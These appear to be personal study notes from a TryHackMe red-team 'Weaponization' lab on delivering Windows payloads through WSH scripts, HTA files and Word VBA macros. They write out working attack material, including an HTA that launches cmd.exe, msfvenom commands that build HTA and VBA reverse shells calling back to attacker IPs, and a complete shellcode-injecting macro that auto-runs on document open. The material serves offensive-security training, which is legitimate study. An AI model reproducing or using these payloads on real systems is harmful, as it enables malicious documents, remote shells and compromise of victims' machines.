# What is Weaponization?
Weaponization is the second step of **[Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)**. In this stage the attacker generates and develops own malicious code using deliverable payloads such as word documents,PDFs etc..

Most organizations have Windows OS running, which is going to be a likely target. An organization's environment policy often blocks downloading `.exe` file. For this reason red teamers rely on executing payloads using other techniques, **such a built-in windows scripting technologies like**:
- The Windows Script Host (WSH)
- An HTML Application (HTA)
- Visual Basic Applications (VBA)
- Powershell (PSH)

For more information about red team toolkits, please visit the following: a **[GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)** that has it all, including initial access, payload development, delivery methods, and others.

# Windows Script Host

It is a Windows native engine, `cscript.exe` (for command-line scripts) and `wscript.exe` (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including **vbs** and **vbe**. 
It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Example code for "Hello World" GUI
```vbs
Dim message 
message = "Welcome to THM"
MsgBox message
```


![[Pasted image 20241104215517.png]]

```
wscript Calc.vbs
cscript Calc.vbs
```

Example code for run calc
```vbs
Set shell = Wscript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

![[Pasted image 20241104215809.png]]



Example code for run a cmd 

```vbs
Set shell = Wscript.CreateObject("Wscript.Shell")
shell.Run "cmd.exe /k whoami",1,true
```

the `1` stand for see the window

```bash
wscript /e:VBScript blacklisted.txt
```

![[Pasted image 20241104222136.png]]


# An HTML Application - HTA 
HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

In the following example, we will use an [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.

```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,


```shell-session
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.


![[Pasted image 20241106223456.png]]

Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.

![[Pasted image 20241106223649.png]]



## HTA Reverse Connection

We can create a reverse shell payload as follows,

```shell-session
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

We use the msfvenom from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.

Once the victim visits the malicious URL and hits run, we get the connection back.

![[Pasted image 20241106224427.png]]

![[Pasted image 20241106224457.png]]

Now upgrade from shell to meterpreter
```
multi/manage/shell_to_meterpreter
```

![[Pasted image 20241106224837.png]]

# Visual Basic for Application (VBA)


VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.   

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications). 

In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.

Now create a new blank Microsoft document to create our first macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting view → macros. The Macros window shows to create our own macro within the document.
![[Pasted image 20241106231859.png]]
In the Macro name section, we choose to name our macro as THM. Note that we need to select from the Macros in list Document1 and finally select create. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message: Welcome to Weaponization Room!. We can do that using the MsgBox function as follows:

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Finally, run the macro by F5 or Run → Run Sub/UserForm.

Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as AutoOpen and Document_open. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the THM function.

```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document and finally, save.

![[Pasted image 20241106231931.png]]

Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.

![[Pasted image 20241106231944.png]]

Once we allowed the Enable Content, our macro gets executed as shown,
![[Pasted image 20241106231959.png]]
Now edit the word document and create a macro function that executes a calc.exe or any executable file as proof of concept as follows,  

```javascript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

To explain the code in detail, with Dim payload As String, we declare payload variable as a string using Dim keyword. With payload = "calc.exe" we are specifying the payload name and finally with CreateObject("Wscript.Shell").Run payload we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the  AutoOpen() and Document_open() functions too.

Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.
![[Pasted image 20241106232048.png]]

It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.


## Reverse connection VBA
Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using msfvenom. We need to specify the Payload, LHOST, and LPORT, which match what is in the Metasploit framework. Note that we specify the payload as VBA to use it as a macro.


```shell-session
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```

```vb
#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Qdt As Long, ByVal Agshqmdcx As Long, ByVal Irmqprmit As LongPtr, Hdmp As Long, ByVal Cxzb As Long, Efx As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Sirzav As Long, ByVal Ambe As Long, ByVal Ztzoh As Long, ByVal Gzpnh As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Qizpyxsf As LongPtr, ByRef Tjv As Any, ByVal Owo As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Qdt As Long, ByVal Agshqmdcx As Long, ByVal Irmqprmit As Long, Hdmp As Long, ByVal Cxzb As Long, Efx As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Sirzav As Long, ByVal Ambe As Long, ByVal Ztzoh As Long, ByVal Gzpnh As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Qizpyxsf As Long, ByRef Tjv As Any, ByVal Owo As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Qdsso As Long, Euu As Variant, Hcca As Long
#If Vba7 Then
	Dim  Apebxtuq As LongPtr, Tocmavpch As LongPtr
#Else
	Dim  Apebxtuq As Long, Tocmavpch As Long
#EndIf
	Euu = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,49,255,15,183,74,38,139,114,40,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,139,66,60,87,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,73,139, _
52,139,49,255,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,10,10,59,150,104,2,0,1,188,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)

	Apebxtuq = VirtualAlloc(0, UBound(Euu), &H1000, &H40)
	For Hcca = LBound(Euu) To UBound(Euu)
		Qdsso = Euu(Hcca)
		Tocmavpch = RtlMoveMemory(Apebxtuq + Hcca, Qdsso, 1)
	Next Hcca
	Tocmavpch = CreateThread(0, 0, Apebxtuq, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Document_Open()
	Auto_Open
End Sub

```

![[Pasted image 20241106231714.png]]



![[Pasted image 20241106231526.png]]



![[Pasted image 20241106231514.png]]
